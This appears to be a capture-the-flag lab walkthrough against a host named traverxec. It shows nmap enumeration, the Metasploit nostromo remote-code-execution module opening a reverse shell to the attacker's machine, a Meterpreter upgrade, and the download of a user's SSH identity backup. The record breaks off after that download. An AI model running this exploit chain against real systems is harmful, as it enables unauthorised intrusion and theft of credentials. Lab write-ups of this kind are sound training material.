$ ping 10.10.10.165
PING 10.10.10.165 (10.10.10.165) 56(84) bytes of data.
64 bytes from 10.10.10.165: icmp_seq=1 ttl=63 time=21.6 ms
64 bytes from 10.10.10.165: icmp_seq=2 ttl=63 time=24.3 ms
64 bytes from 10.10.10.165: icmp_seq=3 ttl=63 time=30.2 ms
^C
--- 10.10.10.165 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 5ms
rtt min/avg/max/mdev = 21.562/25.342/30.204/3.612 ms
$ nmap -sV 10.10.10.165
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-02 09:45 EDT
Nmap scan report for 10.10.10.165
Host is up (0.029s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.75 seconds
.
// The port of interest is the http one (nostromo 1.9.6)
// Start by searching online for an exploit but now let's look on metasploit
.
$ sudo msfconsole                                                                                                        
[sudo] password for **********:                                                                                                                     
[-] ***rting the Metasploit Framework console...\                                                                                                   
[-] * WARNING: No database support: No database YAML file                                                                                           
[-] ***                                                                                                                                             
                                                                                                                                                    
 _                                                    _                                                                                             
/ \    /\         __                         _   __  /_/ __                                                                                         
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                                                                        
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                                                                       
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                                                                       
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                                                                      
                                                                                                                                                    

       =[ metasploit v5.0.83-dev-                         ]
+ -- --=[ 1991 exploits - 1088 auxiliary - 340 post       ]
+ -- --=[ 560 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use the edit command to open the currently active module in your editor

msf5 > searchsploit nostromo
[*] exec: searchsploit nostromo

[i] Found (#2): /opt/exploit-database/files_exploits.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/exploit-database/files_shellcodes.csv
[i] To remove this message, please edit "/opt/exploit-database/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

---------------------------------------------------------------------------------------------------------- -----------------------------------------
 Exploit Title                                                                                            |  Path
                                                                                                          | (/opt/exploit-database/)
---------------------------------------------------------------------------------------------------------- -----------------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                      | exploits/multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                                                    | exploits/multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                      | exploits/linux/remote/35466.sh
---------------------------------------------------------------------------------------------------------- -----------------------------------------
Shellcodes: No Result
msf5 > search nostromo

Matching Modules
================

   #  Name                                   Disclosure Date  Rank  Check  Description
   -  ----                                   ---------------  ----  -----  -----------
   0  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution


msf5 > use 0
msf5 exploit(multi/http/nostromo_code_exec) > set RHOST 10.10.10.165
RHOST => 10.10.10.165
msf5 exploit(multi/http/nostromo_code_exec) > set LHOST 10.10.14.21
LHOST => 10.10.14.21
msf5 exploit(multi/http/nostromo_code_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.21:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.10.14.21:4444 -> 10.10.10.165:52102) at 2020-04-02 10:26:31 -0400

sessions 2
[*] Backgrounding session 1...

msf5 exploit(multi/http/nostromo_code_exec) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.21:4433 
[*] Sending stage (989416 bytes) to 10.10.10.165
[*] Meterpreter session 2 opened (10.10.14.21:4433 -> 10.10.10.165:44936) at 2020-04-02 10:34:04 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
msf5 exploit(multi/http/nostromo_code_exec) > 
[*] Stopping exploit/multi/handler
sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: no-user @ traverxec (uid=33, gid=33, euid=33, egid=33)
meterpreter > shell
Process 1660 created.
Channel 1 created.
cat /etc/issue
Debian GNU/Linux 10 \n \l

uname -a
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 GNU/Linux
env
USER=www-data
HOME=/var/www
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
LANG=C
PWD=/usr/bin
.
.
.
// After trying ALOT of "Basic Linux Privlege Excalation" exploits, we found...
.
.
.
find / -writable -type d 2>/dev/null
/run/lock
/dev/mqueue
/dev/shm
/proc/1674/task/1674/fd
/proc/1674/fd
/proc/1674/map_files
/tmp
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.Test-unix
/tmp/.font-unix
/var/nostromo/logs
/var/tmp
.
.
.
// Obviously /var/nostromo/logs is of interest.
.
.
.
cd var
cd nostromo
.
.
.
// After searching for a little bit...
.
.
.
cd conf
cat .htpasswd
david:********************
.
.
.
// Ok so that was a decoy password... :/
.
.
.
cd /home
ls
david
cd /home/david/public_www
ls
index.html
protected-file-area
cd protected-file-area
ls
backup-ssh-identity-files.tgz
.
.
.
// Now backup-ssh-identity-files.tgz is of interest
.
.
.
exit
meterpreter > cd /home/david/public_www
meterpreter > ls -al
Listing: /home/david/public_www
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  402   fil   2019-10-25 15:45:10 -0400  index.html
40755/rwxr-xr-x   4096  dir   2019-10-25 17:02:59 -0400  protected-file-area

meterpreter > cd protected-file-area
meterpreter > ls
Listing: /home/david/public_www/protected-file-area
===================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  45    fil   2019-10-25 15:46:01 -0400  .htaccess
100644/rw-r--r--  1915  fil   2019-10-25 17:02:59 -0400  backup-ssh-identity-files.tgz

meterpreter > download backup-ssh-identity-files.tgz
[*] Downloading: backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
[*] Downloaded 1.87 KiB of 1.87 KiB (100.0%): backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
[*] download   : backup-ssh-identity-files.tgz -> backup-ssh-identity-files.tgz
.
.
.
// Unpacked in terminal 2.
.
.
.



